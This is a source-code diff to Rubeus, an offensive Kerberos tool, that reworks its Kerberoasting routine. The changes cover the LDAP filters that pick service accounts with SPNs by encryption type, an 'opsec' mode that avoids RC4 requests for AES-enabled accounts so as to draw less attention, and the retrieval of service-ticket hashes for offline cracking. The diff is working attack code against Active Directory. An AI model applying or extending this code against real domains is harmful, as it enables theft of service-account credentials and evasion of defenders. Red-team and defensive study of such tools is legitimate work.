@@ -278,6 +278,11 @@ namespace Rubeus
                 byte[] delegTGTbytes = LSA.RequestFakeDelegTicket("", false);
                 TGT = new KRB_CRED(delegTGTbytes);
             }
+            else
+            {
+                Console.WriteLine("[*] NOTICE: AES hashes will be returned for AES-enabled accounts.");
+                Console.WriteLine("[*]         Use /ticket:X or /tgtdeleg to force RC4 for these accounts.\r\n");
+            }
 
             if (!String.IsNullOrEmpty(spn))
             {
@@ -393,7 +398,6 @@ namespace Rubeus
                 // check to ensure that the bind worked correctly
                 try
                 {
-                    //Guid guid = directoryObject.Guid;
                     string dirPath = directoryObject.Path;
                     if (String.IsNullOrEmpty(dirPath))
                     {
@@ -419,61 +423,47 @@ namespace Rubeus
 
                 try
                 {
-                    if (String.IsNullOrEmpty(userName))
+                    string userFilter = "";
+                    if (!String.IsNullOrEmpty(userName))
                     {
-                        // samAccountType=805306368                                 ->  user account
-                        // serviceprincipalname=*                                   ->  non-null SPN
-                        // samAccountName=krbtgt                                    ->  ignore the krbtgt account
-                        if (String.Equals(supportedEType, "rc4"))
-                        {
-                            // one of the following:
-                            //  !msds-supportedencryptiontypes=*                        ->  null supported etypes, so RC4
-                            //  msds-supportedencryptiontypes=0                         ->  no supported etypes specified, so RC4
-                            //  msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4 ->  supported etypes includes RC4
-                            Console.WriteLine("[*] Searching for accounts that support RC4_HMAC");
-                            userSearcher.Filter = "(&(samAccountType=805306368)(serviceprincipalname=*)(!samAccountName=krbtgt)(|(!msds-supportedencryptiontypes=*)(msds-supportedencryptiontypes=0)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4)))";
-                        }
-                        else if (String.Equals(supportedEType, "rc4opsec"))
-                        {
-                            // "opsec" RC4, meaning don't RC4 roast accounts that support AES
-                            Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");
-                            userSearcher.Filter = "(&(samAccountType=805306368)(serviceprincipalname=*)(!samAccountName=krbtgt)(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))";
-                        }
-                        else if (String.Equals(supportedEType, "aes"))
-                        {
-                            // msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24 ->  supported etypes includes AES128/256
-                            Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
-                            userSearcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))";
-                        }
-                        else
-                        {
-                            Console.WriteLine("\r\n[X] Unsupported encryption type: {0}\r\n", supportedEType);
-                            return;
-                        }
+                        // searching for a specified user
+                        userFilter = String.Format("(samAccountName={0})", userName);
                     }
                     else
                     {
-                        if (String.Equals(supportedEType, "rc4"))
-                        {
-                            Console.WriteLine("[*] Searching for accounts that support RC4_HMAC");
-                            userSearcher.Filter = String.Format("(&(samAccountType=805306368)(serviceprincipalname=*)(samAccountName={0})(|(!msds-supportedencryptiontypes=*)(msds-supportedencryptiontypes=0)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4)))", userName);
-                        }
-                        else if (String.Equals(supportedEType, "rc4opsec"))
-                        {
-                            Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");
-                            userSearcher.Filter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName={0})(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))", userName);
-                        }
-                        else if (String.Equals(supportedEType, "aes"))
-                        {
-                            Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
-                            userSearcher.Filter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName={0})(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))", userName);
-                        }
-                        else
-                        {
-                            Console.WriteLine("\r\n[X] Unsupported encryption type: {0}\r\n", supportedEType);
-                            return;
-                        }
+                        // if no user specified, filter out the krbtgt account
+                        userFilter = "(!samAccountName=krbtgt)";
                     }
+
+                    string encFilter = "";
+                    if (String.Equals(supportedEType, "rc4opsec"))
+                    {
+                        // "opsec" RC4, meaning don't RC4 roast accounts that support AES
+                        Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");
+                        encFilter = "(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
+                    }
+                    else if (String.Equals(supportedEType, "aes"))
+                    {
+                        // msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24 ->  supported etypes includes AES128/256
+                        Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
+                        encFilter = "(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
+                    }
+
+                    // Note: I originally thought that if enctypes included AES but DIDN'T include RC4, 
+                    //       then RC4 tickets would NOT be returned, so the original filter was:
+                    //  !msds-supportedencryptiontypes=*                        ->  null supported etypes, so RC4
+                    //  msds-supportedencryptiontypes=0                         ->  no supported etypes specified, so RC4
+                    //  msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4 ->  supported etypes includes RC4
+                    //  userSearcher.Filter = "(&(samAccountType=805306368)(serviceprincipalname=*)(!samAccountName=krbtgt)(|(!msds-supportedencryptiontypes=*)(msds-supportedencryptiontypes=0)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4)))";
+
+                    //  But apparently Microsoft is silly and doesn't really follow their own docs and RC4 is always returned regardless ¯\_(ツ)_/¯
+                    //      so this fine-grained filtering is not needed
+
+
+                    // samAccountType=805306368                                 ->  user account
+                    // serviceprincipalname=*                                   ->  non-null SPN
+                    string userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
+                    userSearcher.Filter = userSearchFilter;
                 }
                 catch (Exception ex)
                 {
@@ -491,7 +481,7 @@ namespace Rubeus
                     }
                     else
                     {
-                        Console.WriteLine("\r\n[*] Found {0} users to Kerberoast!", users.Count);
+                        Console.WriteLine("\r\n[*] Found {0} user(s) to Kerberoast!", users.Count);
                     }
 
                     foreach (SearchResult user in users)
@@ -517,6 +507,7 @@ namespace Rubeus
                         {
                             // if a TGT .kirbi is supplied, use that for the request
                             //      this could be a passed TGT or if TGT delegation is specified
+
                             if (    String.Equals(supportedEType, "rc4") &&
                                     (
                                         ((supportedETypes & Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) ||
@@ -529,7 +520,7 @@ namespace Rubeus
                             }
                             else
                             {
-                                // otherwise don't force RC4
+                                // otherwise don't force RC4 - have all supported encryption types for opsec reasons
                                 GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, dc, false);
                             }
                         }
